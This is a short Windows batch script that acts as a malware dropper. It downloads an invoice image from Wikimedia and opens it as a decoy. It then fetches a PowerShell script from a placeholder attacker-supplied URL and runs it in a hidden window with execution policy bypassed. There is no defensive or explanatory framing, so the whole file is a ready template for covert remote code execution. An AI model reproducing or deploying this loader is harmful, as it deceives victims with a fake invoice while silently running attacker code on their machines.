pushd %temp%
powershell Invoke-WebRequest "https://upload.wikimedia.org/wikipedia/commons/2/22/Cligraphcrm_facture.png" -Outfile "Invoice.png"
Invoice.png 
powershell Invoke-WebRequest -Uri site hosting your powershell script -OutFile .\power.ps1; 
start PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -file "power.ps1"
